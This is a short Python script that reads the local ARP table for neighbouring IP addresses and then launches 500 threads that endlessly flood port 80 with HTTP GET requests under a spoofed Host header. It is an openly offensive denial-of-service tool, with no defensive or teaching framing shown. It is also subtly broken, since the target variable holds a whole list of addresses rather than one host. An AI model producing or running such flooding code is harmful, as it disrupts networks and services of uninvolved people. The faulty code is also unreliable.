import re
import subprocess
import socket
import threading

oswyniki = subprocess.getoutput('arp -a')

wzorzec = re.compile(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
wynik = (wzorzec.findall(oswyniki))
wynik.pop(0)

fake_ip = '182.21.20.32'
target = wynik
port = 80

attack_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()